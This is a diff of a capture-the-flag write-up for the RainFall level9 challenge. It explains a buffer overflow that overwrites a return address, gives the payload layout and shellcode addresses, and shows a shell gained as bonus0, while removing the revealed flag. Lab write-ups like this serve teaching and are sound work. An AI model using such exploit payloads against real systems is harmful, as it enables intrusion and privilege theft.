@@ -143,6 +143,25 @@ The return address is overwritten.
 
 We use that [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html) from kernel_panik. 
 
+```
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+```
+As you can see, the main dereferences the content stored at `edx`, so instead of directly passing the shell code, we need to pass the address of the shell.
+So, to make it clearer:
+1. We buffer overflow in `memcopy` to overwrite the return address
+2. We overwrite the return address by the address of the start of the buffer
+3. The program dereferences the content of `edx`, and calls the pointed address, which is going to be the address of the start of the shellcode (the address of the buffer + the 4 bytes for the written address of the shellcode)
+4. The program executes the shellcode
+
+Thus, the payload is in the form of:
+```
+[SHELL ADDRESS] + [SHELL CODE] + [PADDING] + [BUFFER ADDRESS]
+```
+
+The shell address is the buffer address + the size of an address, 4 bytes. So shell address = `0x804a00c` + 4 = `0x804a010`
+
 We now have a shellcode, a buffer length, the buffer address and our shell address, let's make our payload:
 ```py
 len_buffer = 108
@@ -166,5 +185,4 @@ level9@RainFall:~$ ./level9 $(python script.py)
 $ whoami
 bonus0
 $ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
